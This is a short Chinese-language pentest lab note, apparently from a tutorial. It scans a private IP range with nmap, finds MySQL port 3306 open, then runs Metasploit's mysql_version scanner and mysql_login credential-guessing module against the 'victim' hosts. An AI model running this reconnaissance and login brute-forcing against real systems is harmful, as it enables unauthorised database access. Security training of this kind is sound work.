# Metasploit-Mysql

---

 针对目标受害者主机进行信息收集 nmap -sV 192.168.126.170-200

目标攻击者主机开启了3306危险端口。

msfconsole

search mysql_version

use auxiliary/scanner/mysql/mysql_version

show options

set rhosts 192.168.126.170-200

set threads 50

run

---

back

search mysql_login

利用检索到的攻击模块

use auxiliary/scanner/mysql/mysql_login

show options

run
